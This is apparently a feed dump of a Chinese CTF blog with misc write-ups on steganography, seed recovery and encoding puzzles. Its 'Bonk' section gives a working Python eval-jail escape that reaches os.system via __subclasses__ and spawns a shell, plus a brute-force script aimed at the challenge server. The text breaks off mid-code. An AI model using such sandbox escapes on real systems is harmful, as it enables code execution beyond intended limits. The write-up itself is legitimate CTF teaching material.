class_">Println</span>(arr)<br>&#125;<br></code></pre></td></tr></table></figure><p>其实想法很简单,拿个按顺序的顺序,用时间戳作为种子,然后Shuffle 替换顺序,根据后面的顺序还原结果就好</p><p>很坑,上面这个人用的是微妙,我试了好几遍微妙,毫秒的,结果最后<strong>时间戳就是转换成秒就可以</strong></p><p>汇总代码:</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs jsx">func <span class="hljs-title class_">TestDecodePng</span>(t *testing.<span class="hljs-property">T</span>) &#123;<br>network, _ := os.<span class="hljs-title class_">ReadFile</span>(<span class="hljs-string">&quot;/Users/yuan/Downloads/谍影重重附件/flag&quot;</span>)<br>r := bytes.<span class="hljs-title class_">NewReader</span>(network)<br>dec := gob.<span class="hljs-title class_">NewDecoder</span>(r)<br><span class="hljs-keyword">var</span> X map[string][]byte<br>err := dec.<span class="hljs-title class_">Decode</span>(&amp;X)<br><span class="hljs-keyword">if</span> err != nil &#123;<br>log.<span class="hljs-title class_">Fatal</span>(<span class="hljs-string">&quot;decode:&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">var</span> data []byte<br><span class="hljs-keyword">for</span> k, v := range X &#123;<br><span class="hljs-comment">//fmt.Println(&quot;key:&quot;, k), &quot;value_hex:&quot;, hex.EncodeToString(v), &quot;valuestring:&quot;, string(v))</span><br><span class="hljs-keyword">if</span> strings.<span class="hljs-title class_">Contains</span>(k, <span class="hljs-string">&quot;PNG&quot;</span>) &#123;<br>data = v<br>&#125;<br>&#125;<br><br>arr := <span class="hljs-title function_">make</span>([]int, <span class="hljs-title function_">len</span>(data))<br><br><span class="hljs-keyword">for</span> m := <span class="hljs-number">0</span>; m &lt; <span class="hljs-title function_">len</span>(data); m++ &#123;<br>arr[m] = m<br>&#125;<br><span class="hljs-comment">//fmt.Println(arr)</span><br>fmt.<span class="hljs-title class_">Println</span>(time.<span class="hljs-title class_">Now</span>().<span class="hljs-title class_">UnixNano</span>())<br><br>rand.<span class="hljs-title class_">Seed</span>(<span class="hljs-number">1658213396</span>)<br>rand.<span class="hljs-title class_">Shuffle</span>(<span class="hljs-title function_">len</span>(arr), <span class="hljs-title function_">func</span>(<span class="hljs-params">i, j int</span>) &#123;<br>arr[i], arr[j] = arr[j], arr[i]<br>&#125;)<br><span class="hljs-comment">//fmt.Println(arr)</span><br>fmt.<span class="hljs-title class_">Println</span>(data[<span class="hljs-number">0</span>])<br>data_final := <span class="hljs-title function_">make</span>([]byte, <span class="hljs-title function_">len</span>(data))<br><br><span class="hljs-keyword">for</span> m := <span class="hljs-number">0</span>; m &lt; <span class="hljs-title function_">len</span>(data); m++ &#123;<br>data_final[arr[m]] = data[m]<br>&#125;<br>flag, _ := os.<span class="hljs-title class_">Create</span>(<span class="hljs-string">&quot;flag.png&quot;</span>)<br>flag.<span class="hljs-title class_">Write</span>(data_final)<br>flag.<span class="hljs-title class_">Close</span>()<br><br>&#125;<br></code></pre></td></tr></table></figure><p>得到flag,不得不说,哥哥真能套,真的有人能做完这题再去做比的题???</p><p><img src="/../imgs/20220731/Untitled%2011.png" alt="Untitled"></p><h2 id="0x05-通道隐写"><a href="#0x05-通道隐写" class="headerlink" title="0x05 通道隐写"></a>0x05 通道隐写</h2><p>真是栓Q啊,没有任何提示,硬找….真的想骂人</p><p><img src="/../imgs/20220731/Untitled%2012.png" alt="Untitled"></p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="ctfwp" scheme="https://www.imfengyuan.info/categories/ctfwp/"/>
    
    
  </entry>
  
  <entry>
    <title>2022-Dice@Hope-Misc-部分Wp</title>
    <link href="https://www.imfengyuan.info/2022/07/23/20220723DICE/"/>
    <id>https://www.imfengyuan.info/2022/07/23/20220723DICE/</id>
    <published>2022-07-23T11:19:23.000Z</published>
    <updated>2022-07-23T12:20:23.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h1><p><a href="http://output.pn/">output.pn</a>g</p><p><img src="/../imgs/20220723DICE/output.png" alt="output.png"></p><p>Encode.py</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">from</span> <span class="hljs-variable constant_">PIL</span> <span class="hljs-keyword">import</span> (<br>    <span class="hljs-title class_">Image</span>,<br>    <span class="hljs-title class_">ImageDraw</span>,<br>    <span class="hljs-title class_">ImageFont</span>,<br>)<br><br><span class="hljs-variable constant_">IMAGE_PATH</span> = <span class="hljs-string">&#x27;image.png&#x27;</span><br><span class="hljs-variable constant_">OUTPUT_PATH</span> = <span class="hljs-string">&#x27;output.png&#x27;</span><br><br><span class="hljs-variable constant_">FLAG_PATH</span> = <span class="hljs-string">&#x27;flag.txt&#x27;</span><br><span class="hljs-variable constant_">FONT_PATH</span> = <span class="hljs-string">&#x27;font.ttf&#x27;</span><br><br><span class="hljs-variable constant_">PADDING</span> = <span class="hljs-number">100</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-title function_">open</span>(<span class="hljs-variable constant_">FLAG_PATH</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-attr">f</span>:<br>    flag = f.<span class="hljs-title function_">read</span>().<span class="hljs-title function_">strip</span>()<br><br><span class="hljs-keyword">with</span> <span class="hljs-title class_">Image</span>.<span class="hljs-title function_">open</span>(<span class="hljs-variable constant_">IMAGE_PATH</span>) <span class="hljs-keyword">as</span> <span class="hljs-attr">original_image</span>:<br>    width, height = original_image.<span class="hljs-property">size</span><br>    mode = original_image.<span class="hljs-property">mode</span><br>    original_data = <span class="hljs-title function_">list</span>(original_image.<span class="hljs-title function_">getdata</span>())<br><br># figure out what font size to use<br>scale = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">10</span><br>test_font = <span class="hljs-title class_">ImageFont</span>.<span class="hljs-title function_">truetype</span>(<span class="hljs-variable constant_">FONT_PATH</span>, size=scale)<br>text_width = <span class="hljs-title function_">int</span>(<span class="hljs-title function_">sum</span>(test_font.<span class="hljs-title function_">getlength</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> flag))<br>font_size = scale * (width - <span class="hljs-number">2</span> * <span class="hljs-variable constant_">PADDING</span>) <span class="hljs-comment">// text_width</span><br><br># write the flag text<br>flag_image = <span class="hljs-title class_">Image</span>.<span class="hljs-title function_">new</span>(<span class="hljs-string">&#x27;1&#x27;</span>, (width, height), <span class="hljs-number">1</span>)<br>font = <span class="hljs-title class_">ImageFont</span>.<span class="hljs-title function_">truetype</span>(<span class="hljs-variable constant_">FONT_PATH</span>, font_size)<br>context = <span class="hljs-title class_">ImageDraw</span>.<span class="hljs-title class_">Draw</span>(flag_image)<br>context.<span class="hljs-title function_">text</span>(<br>    (width <span class="hljs-comment">// 2, height // 2),</span><br>    flag,<br>    anchor=<span class="hljs-string">&#x27;mm&#x27;</span>,<br>    font=font,<br>    fill=<span class="hljs-number">0</span><br>)<br>flag_data = flag_image.<span class="hljs-title function_">getdata</span>()<br><br># create the output image<br>output_image = <span class="hljs-title class_">Image</span>.<span class="hljs-title function_">new</span>(mode, (width, height))<br><br># <span class="hljs-keyword">let</span><span class="hljs-string">&#x27;s hope the image has the relevant channels</span><br><span class="hljs-string">def set_channel_bits(pixel, bits):</span><br><span class="hljs-string">    new = []</span><br><span class="hljs-string">    for channel, bit in zip(pixel, bits):</span><br><span class="hljs-string">        channel &amp;= ~1</span><br><span class="hljs-string">        channel |= bit</span><br><span class="hljs-string">        new.append(channel)</span><br><span class="hljs-string">    new.extend(pixel[len(bits):])</span><br><span class="hljs-string">    return tuple(new)</span><br><span class="hljs-string"></span><br><span class="hljs-string"># THE IMPORTANT PART!!!</span><br><span class="hljs-string">output_data = []</span><br><span class="hljs-string">for original_pixel, flag_pixel in zip(original_data, flag_data):</span><br><span class="hljs-string">    a = random.randrange(2)</span><br><span class="hljs-string">    b = random.randrange(2)</span><br><span class="hljs-string">    c = a ^ b ^ flag_pixel</span><br><span class="hljs-string">    output_data.append(</span><br><span class="hljs-string">        set_channel_bits(original_pixel, (a, b, c))</span><br><span class="hljs-string">    )</span><br><span class="hljs-string"></span><br><span class="hljs-string">output_image.putdata(output_data)</span><br><span class="hljs-string">output_image.save(OUTPUT_PATH)</span><br></code></pre></td></tr></table></figure><p>Exp</p><p>(一开始是想完整的返回flag_pixel,但是这是不可能的,索性就只找到flag_pixel可能为0的值即可,a &#x3D; 0 ,b &#x3D;0 ,c &#x3D;0 → flag_pixel &#x3D; 0)</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">from</span> <span class="hljs-variable constant_">PIL</span> <span class="hljs-keyword">import</span> (<br>    <span class="hljs-title class_">Image</span>,<br>    <span class="hljs-title class_">ImageDraw</span>,<br>    <span class="hljs-title class_">ImageFont</span>,<br>)<br><br><span class="hljs-variable constant_">IMAGE_PATH</span> = <span class="hljs-string">&#x27;output.png&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-title class_">Image</span>.<span class="hljs-title function_">open</span>(<span class="hljs-variable constant_">IMAGE_PATH</span>) <span class="hljs-keyword">as</span> <span class="hljs-attr">output_image</span>:<br>    width, height = output_image.<span class="hljs-property">size</span><br>    mode = output_image.<span class="hljs-property">mode</span><br>    output_data = <span class="hljs-title function_">list</span>(output_image.<span class="hljs-title function_">getdata</span>())<br>    <br>flag_data = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-attr">output_data</span>:<br>    x,y,z,m = i<br>    <span class="hljs-keyword">if</span> x %<span class="hljs-number">2</span> ==<span class="hljs-number">0</span> and y %<span class="hljs-number">2</span> == <span class="hljs-number">0</span> and z %<span class="hljs-number">2</span> == <span class="hljs-number">0</span> :<br>        flag_data.<span class="hljs-title function_">append</span>(<span class="hljs-number">0</span>)<br>    <span class="hljs-attr">else</span>:<br>        flag_data.<span class="hljs-title function_">append</span>(<span class="hljs-number">1</span>)<br>    <br>flag_image = <span class="hljs-title class_">Image</span>.<span class="hljs-title function_">new</span>(<span class="hljs-string">&#x27;1&#x27;</span>, (width, height), <span class="hljs-number">1</span>)<br>flag_image.<span class="hljs-title function_">putdata</span>(flag_data)<br>flag_image.<span class="hljs-title function_">show</span>()<br></code></pre></td></tr></table></figure><p>Flag</p><p><img src="/../imgs/20220723DICE/Untitled.png" alt="Untitled"></p><h1 id="Bonk"><a href="#Bonk" class="headerlink" title="Bonk"></a>Bonk</h1><p><img src="/../imgs/20220723DICE/Untitled-9492194.png" alt="Untitled"></p><p>Dockerfile</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-variable constant_">FROM</span> pwn.<span class="hljs-property">red</span>/<span class="hljs-attr">jail</span>:<span class="hljs-number">0.3</span><span class="hljs-number">.0</span><br><br><span class="hljs-variable constant_">COPY</span> --<span class="hljs-keyword">from</span>=<span class="hljs-attr">python</span>:<span class="hljs-number">3.10</span> / /srv<br><span class="hljs-variable constant_">COPY</span> bonk.<span class="hljs-property">py</span> /srv/app/run<br><span class="hljs-variable constant_">COPY</span> flag.<span class="hljs-property">txt</span> /srv/app<br><span class="hljs-variable constant_">RUN</span> mv /srv/app/flag.<span class="hljs-property">txt</span> /srv/app/flag.<span class="hljs-property">$RANDOM$RANDOM</span>.<span class="hljs-property">txt</span><br></code></pre></td></tr></table></figure><p>在docker build中遇到的几个问题记录</p><p>1.没有权限</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jsx">⚙ yuan@<span class="hljs-title class_">MacBook</span>-<span class="hljs-title class_">Pro</span>-<span class="hljs-number">2</span>  ~<span class="hljs-regexp">/Documents/</span>ctf/dicehope/pyjail  sudo docker run dicepyjail<br><span class="hljs-title class_">Password</span>:<br><span class="hljs-attr">error</span>: delegate <span class="hljs-attr">cgroup</span>: mount cgroup2 to /jail/cgroup/<span class="hljs-attr">unified</span>: operation not permitted<br><br>解决方案: --privileged <br>⚙ yuan@<span class="hljs-title class_">MacBook</span>-<span class="hljs-title class_">Pro</span>-<span class="hljs-number">2</span>  ~<span class="hljs-regexp">/Documents/</span>ctf/dicehope/pyjail  docker run --privileged <span class="hljs-number">030</span><br>[I][<span class="hljs-number">2022</span>-<span class="hljs-number">07</span>-23<span class="hljs-attr">T07</span>:<span class="hljs-number">13</span>:<span class="hljs-number">53</span>+<span class="hljs-number">0000</span>] <span class="hljs-title class_">Mode</span>: <span class="hljs-variable constant_">LISTEN_TCP</span><br></code></pre></td></tr></table></figure><p>2.无法启用bash</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs jsx">yuan@<span class="hljs-title class_">MacBook</span>-<span class="hljs-title class_">Pro</span>-<span class="hljs-number">2</span>  ~  docker exec -it e233 /bin/bash<br><span class="hljs-variable constant_">OCI</span> runtime exec <span class="hljs-attr">failed</span>: exec <span class="hljs-attr">failed</span>: container_linux.<span class="hljs-property">go</span>:<span class="hljs-number">380</span>: starting container process <span class="hljs-attr">caused</span>: <span class="hljs-attr">exec</span>: <span class="hljs-string">&quot;/bin/bash&quot;</span>: stat /bin/<span class="hljs-attr">bash</span>: no such file or <span class="hljs-attr">directory</span>: unknown<br><br>解决方案: 先用/bin/sh进入,当然进去也用不了 进去之后到工作目录 /srv下执行chroot . ,为什么可以百度<br>yuan@<span class="hljs-title class_">MacBook</span>-<span class="hljs-title class_">Pro</span>-<span class="hljs-number">2</span>  ~  docker exec -it e233 /bin/sh<br>/ # bash<br>/bin/<span class="hljs-attr">sh</span>: <span class="hljs-attr">bash</span>: not found<br>yuan@<span class="hljs-title class_">MacBook</span>-<span class="hljs-title class_">Pro</span>-<span class="hljs-number">2</span>  ~  docker exec -it e233 /bin/sh<br>/ # chroot .<br>/ # bash<br>/bin/<span class="hljs-attr">sh</span>: <span class="hljs-attr">bash</span>: not found<br>/srv # bash<br>/bin/<span class="hljs-attr">sh</span>: <span class="hljs-attr">bash</span>: not found<br>/srv # chroot .<br>root@<span class="hljs-attr">e233eec045bc</span>:/#<br></code></pre></td></tr></table></figure><p>Source Code</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jsx"> #!<span class="hljs-regexp">/usr/</span>bin/env python3<br><span class="hljs-keyword">import</span> string<br>code = <span class="hljs-title function_">input</span>(<span class="hljs-string">&quot;Welcome to python! Enter your code: &quot;</span>)<br>allowed = <span class="hljs-title function_">set</span>(string.<span class="hljs-property">ascii_lowercase</span>+<span class="hljs-string">&#x27;()[]._&#x27;</span>+string.<span class="hljs-property">digits</span>)<br><span class="hljs-keyword">if</span> allowed | <span class="hljs-title function_">set</span>(code) != <span class="hljs-attr">allowed</span>:<br>    raise <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;bonk go to python jail&quot;</span>)<br><span class="hljs-title function_">compile</span>(code, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>)<br><span class="hljs-title function_">print</span>(code)<br><span class="hljs-built_in">eval</span>(code[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>:<span class="hljs-number">2</span>], &#123;<span class="hljs-string">&quot;__builtins__&quot;</span>: <span class="hljs-title class_">None</span>&#125;)<br></code></pre></td></tr></table></figure><p>1.只允许小写字母、数字、()[]. 输入</p><p>2.通过{“<strong>builtins</strong>“: None}禁用所有的内置函数(可通过dir()查看有哪些函数)</p><p>绕过2网上payload很多,<a href="https://netsec.expert/posts/breaking-python3-eval-protections/">https://netsec.expert/posts/breaking-python3-eval-protections/</a></p><p>例如:</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx">[x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span>  [].<span class="hljs-property">__class__</span>.<span class="hljs-property">__base__</span>.<span class="hljs-title function_">__subclasses__</span>() <span class="hljs-keyword">if</span> x.<span class="hljs-property">__name__</span> == <span class="hljs-string">&#x27;BuiltinImporter&#x27;</span>][<span class="hljs-number">0</span>]().<span class="hljs-title function_">load_module</span>(<span class="hljs-string">&#x27;os&#x27;</span>).<span class="hljs-title function_">system</span>(<span class="hljs-string">&quot;echo pwned&quot;</span>)<br></code></pre></td></tr></table></figure><p>因为无法使用引号,即参数可通过 <strong>doc</strong> 和 <strong>add</strong> 进行构造</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jsx">&gt;&gt;&gt; ().<span class="hljs-property">__doc__</span><br><span class="hljs-string">&quot;Built-in immutable sequence.\n\nIf no argument is given, the constructor returns an empty tuple.\nIf iterable is specified the tuple is initialized from iterable&#x27;s items.\n\nIf the argument is a tuple, the return value is the same object.&quot;</span><br>&gt;&gt;&gt; ().<span class="hljs-property">__doc__</span>[<span class="hljs-number">34</span>].<span class="hljs-title function_">__add__</span>(().<span class="hljs-property">__doc__</span>[<span class="hljs-number">19</span>])<br><span class="hljs-string">&#x27;os&#x27;</span><br>&gt;&gt;&gt; ().<span class="hljs-property">__doc__</span>[<span class="hljs-number">19</span>].<span class="hljs-title function_">__add__</span>(().<span class="hljs-property">__doc__</span>[<span class="hljs-number">56</span>])<br><span class="hljs-string">&#x27;sh&#x27;</span><br></code></pre></td></tr></table></figure><p>3.利用compile和code[:-1:2]进行过滤, </p><ul><li><p>compile函数code的语法必须符合python的规范否则报错</p></li><li><p>步长为2,可以先用工具添加a,然后手工修改部分括号-中括号可能引起的错误</p></li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx">[]].<span class="hljs-property">a_a_acalaaasasa_a_a</span>.<span class="hljs-property">a_a_abaaasaea_a_a</span>.<span class="hljs-title function_">a_a_asauabacalaaasasae</span>(<span class="hljs-title function_">sa_a_a</span>(a)([a8a4a])(a)).<span class="hljs-title function_">alaoaaada_amaoadaualae</span>((<span class="hljs-title function_">a</span>(a)).<span class="hljs-title function_">a_a_adao</span>(ca_a_a[a3a4a]).<span class="hljs-title function_">a_a_aaad</span>(<span class="hljs-title function_">da_a_a</span>(<span class="hljs-title function_">a</span>(a)).<span class="hljs-title function_">a_a_adao</span>(ca_a_a[a1a9a]))()).<span class="hljs-title function_">asayasat</span>(<span class="hljs-title function_">eama</span>(<span class="hljs-title function_">a</span>(a)).<span class="hljs-title function_">a_a_ad</span>(oaca_a_a[a3a]).<span class="hljs-title function_">a_a_aaad</span>(<span class="hljs-title function_">da_a_a</span>(<span class="hljs-title function_">a</span>(a)).<span class="hljs-title function_">a_a_ad</span>(<span class="hljs-title function_">o</span>(ca_a_a[a1a9a]))))()<br></code></pre></td></tr></table></figure><p>因为无法使用空格,所以需要找到BuiltinImporter具体在__subclasses__中的位置</p><ul><li><p>通过Dockerfile (经过测试可能也不一样)</p></li><li><p>通过爆破</p></li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">from</span> zio <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> urandom<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-title function_">range</span>(<span class="hljs-number">80</span>,<span class="hljs-number">100</span>):<br>    io = <span class="hljs-title function_">zio</span>((<span class="hljs-string">&#x27;mc.ax&#x27;</span>,<span class="hljs-number">31421</span>))<br>    io.<span class="hljs-title function_">read_until</span>(<span class="hljs-string">&#x27;Enter your code:&#x27;</span>)<br>    io.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;[[]].a_a_acalaaasasa_a_a.a_a_abaaasaea_a_a.a_a_asauabacalaaasasae(sa_a_a(a)([a&#x27;</span> +<span class="hljs-title function_">str</span>(i)[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;a&#x27;</span> + <span class="hljs-title function_">str</span>(i)[<span class="hljs-number">1</span>]+ <span class="hljs-string">&#x27;a])(a)).alaoaaada_amaoadaualae((a(a)).a_a_adao(ca_a_a[a3a4a]).a_a_aaad(da_a_a(a(a)).a_a_adao(ca_a_a[a1a9a]))()).asayasat(eama(a(a)).a_a_ad(oaca_a_a[a3a]).a_a_aaad(da_a_a(a(a)).a_a_ad(o(ca_a_a[a1a9a]))))()\n&#x27;</span>)<br>    io.<span class="hljs-title function_">read_until</span>(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>确认序号为84</p><p><img src="/../imgs/20220723DICE/Untitled%201.png" alt="Untitled"></p><p>最后,因为().__doc__中没有数字(无法直接cat flag*)、没有星号(* 无法使用 cat *)、且没有字母“x”,所以只能另辟蹊径(所有内置函数不可用,比如dict().__doc__中有星号,无法使用dict()等,无法使用input(),因为无法拼接input和() )</p><p>最后最后发现</p><p><img src="/../imgs/20220723DICE/Untitled%202.png" alt="Untitled"></p><p>所以只需要将上述payload中的ls换成sh的__doc__的索引即可</p><p>最终payload</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx">[[]].<span class="hljs-property">a_a_acalaaasasa_a_a</span>.<span class="hljs-property">a_a_abaaasaea_a_a</span>.<span class="hljs-title function_">a_a_asauabacalaaasasae</span>(<span class="hljs-title function_">sa_a_a</span>(a)([a8a4a])(a)).<span class="hljs-title function_">alaoaaada_amaoadaualae</span>((<span class="hljs-title function_">a</span>(a)).<span class="hljs-title function_">a_a_adao</span>(ca_a_a[a3a4a]).<span class="hljs-title function_">a_a_aaad</span>(<span class="hljs-title function_">da_a_a</span>(<span class="hljs-title function_">a</span>(a)).<span class="hljs-title function_">a_a_adao</span>(ca_a_a[a1a9a]))()).<span class="hljs-title function_">asayasat</span>(<span class="hljs-title function_">eama</span>(<span class="hljs-title function_">a</span>(a)).<span class="hljs-title function_">a_a_ad</span>(oaca_a_a[a1a9a]).<span class="hljs-title function_">a_a_aaad</span>(<span class="hljs-title function_">da_a_a</span>(<span class="hljs-title function_">a</span>(a)).<span class="hljs-title function_">a_a_ad</span>(<span class="hljs-title function_">o</span>(ca_a_a[a5a6a]))))()<br></code></pre></td></tr></table></figure><p>Flag</p><p><img src="/../imgs/20220723DICE/Untitled%203.png" alt="Untitled"></p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="ctfwp" scheme="https://www.imfengyuan.info/categories/ctfwp/"/>
    
    
  </entry>
  
  <entry>
    <title>2022-BDSecCTF-Misc-部分Wp</title>
    <link href="https://www.imfengyuan.info/2022/07/22/20220722BDSEC/"/>
    <id>https://www.imfengyuan.info/2022/07/22/20220722BDSEC/</id>
    <published>2022-07-22T22:19:23.000Z</published>
    <updated>2022-07-22T22:20:23.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Sound’s-Good"><a href="#Sound’s-Good" class="headerlink" title="Sound’s Good"></a>Sound’s Good</h1><p>Challenge can give you intention sound can give you direction.</p><p>题目给了一个txt文件,base64解码得到mp3文件</p><p><a href="../file/file_(1).txt">file (1).txt</a></p><p>mp3 声音🔊 英文数字 → 使用在线英语解析可以得到</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jsx">x = <span class="hljs-string">&#x27;41104246425033665446334657531140525372164752427652150146575063303210710276175&#x27;</span><br><br><span class="hljs-title function_">print</span>(<span class="hljs-title function_">int</span>(x,<span class="hljs-number">8</span>).<span class="hljs-title function_">to_bytes</span>(<span class="hljs-number">46</span>,byteorder=<span class="hljs-string">&#x27;big&#x27;</span>))<br><br>或者<br><span class="hljs-string">`bytes.fromhex(hex(int(&quot;41104246425033665446334657531140525372164752427652150146575063303210710276175&quot;,8))[2:])`</span><br><br></code></pre></td></tr></table></figure><h1 id="Message-of-Hufflepuff"><a href="#Message-of-Hufflepuff" class="headerlink" title="Message of Hufflepuff"></a>Message of Hufflepuff</h1><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jsx">def <span class="hljs-title function_">get_key</span>(dict, value):<br>    <span class="hljs-keyword">return</span> [k <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> dict.<span class="hljs-title function_">items</span>() <span class="hljs-keyword">if</span> v == value]<br>d = [<span class="hljs-string">&#x27;00101&#x27;</span>,<span class="hljs-string">&#x27;111&#x27;</span>,<span class="hljs-string">&#x27;00110&#x27;</span>,<span class="hljs-string">&#x27;1011&#x27;</span>,<span class="hljs-string">&#x27;1001&#x27;</span>,<span class="hljs-string">&#x27;00111&#x27;</span>,<span class="hljs-string">&#x27;00010&#x27;</span>,<span class="hljs-string">&#x27;01000&#x27;</span>,<span class="hljs-string">&#x27;1000&#x27;</span>,<span class="hljs-string">&#x27;1000&#x27;</span>,<span class="hljs-string">&#x27;00100&#x27;</span>,<span class="hljs-string">&#x27;01011&#x27;</span>,<span 